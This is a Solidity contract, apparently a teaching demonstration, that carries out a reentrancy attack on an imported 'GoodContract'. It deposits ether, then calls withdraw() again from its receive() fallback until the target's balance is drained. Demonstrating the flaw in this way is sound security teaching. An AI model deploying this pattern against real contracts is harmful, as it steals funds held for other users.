// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./GoodContract.sol";

contract BadContract {
    GoodContract goodContract;

    constructor(address _goodContract){
        goodContract = GoodContract(_goodContract);
    }

    receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}
